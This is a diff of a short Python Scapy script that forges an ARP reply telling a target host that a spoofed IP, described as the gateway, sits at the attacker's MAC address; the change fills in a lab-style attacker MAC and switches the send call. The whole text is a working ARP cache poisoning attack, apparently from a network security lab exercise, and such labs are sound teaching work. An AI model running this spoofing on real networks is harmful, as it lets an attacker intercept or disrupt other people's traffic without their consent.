@@ -7,7 +7,7 @@ target_mac = "02:42:0a:09:00:05"
 # IP you are pretending to be (e.g., the gateway)
 spoofed_ip = "10.9.0.17"
 # Your attacking machine's MAC address
-attacker_mac = "aa:bb:cc:dd:ee:ff"
+attacker_mac = "02:42:0a:09:00:69"
 # Create the spoofed ARP reply
 arp_response = ARP(
     op=2,                        # 2 = ARP Reply
@@ -18,5 +18,5 @@ arp_response = ARP(
 )
 
 # Send the spoofed packet
-send(arp_response, iface="eth0", verbose=False)  # Change iface to your actual interface
+sendp(arp_response)  # Change iface to your actual interface
 print(f"Spoofed ARP reply sent to {target_ip}, claiming {spoofed_ip} is at {attacker_mac}")
